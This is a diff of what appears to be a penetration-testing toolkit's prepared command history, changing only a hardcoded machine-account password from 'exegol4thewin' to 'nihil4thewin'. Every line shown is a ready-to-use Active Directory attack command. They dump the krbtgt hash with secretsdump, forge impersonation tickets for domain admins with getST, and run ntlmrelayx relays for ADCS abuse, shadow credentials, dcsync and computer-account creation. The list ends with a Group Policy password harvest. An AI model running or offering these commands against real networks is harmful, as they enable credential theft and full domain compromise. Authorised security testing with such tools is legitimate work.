@@ -17,7 +17,7 @@ secretsdump.py -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_H
 KRB5CCNAME="$CCACHE_PATH" secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
 KRB5CCNAME="$CCACHE_PATH" getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
 getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
-getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'exegol4thewin'
+getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'nihil4thewin'
 getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
 getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
 renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
@@ -26,8 +26,8 @@ ntlmrelayx -t "https://pki.$DOMAIN/certsrv/certfnsh.asp" -smb2support --adcs --t
 ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
 ntlmrelayx -t dcsync://"$DC_HOST" -smb2support
 ntlmrelayx -t "ldaps://$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --escalate-user 'NIHIL-01$'
-ntlmrelayx -t ldaps://"$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --add-computer 'NIHIL-01' 'exegol4thewin'
-ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --delegate-access --add-computer 'NIHIL-01' 'exegol4thewin'
+ntlmrelayx -t ldaps://"$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --add-computer 'NIHIL-01' 'nihil4thewin'
+ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --delegate-access --add-computer 'NIHIL-01' 'nihil4thewin'
 ntlmrelayx -t ldap://"$DC_HOST" -smb2support --interactive
 ntlmrelayx -tf targets.txt -w --ipv6 -smb2support --lootdir ntlmrelayx_lootdir --http-port 3128,80
 Get-GPPPassword -debug -no-pass "$DC_HOST"
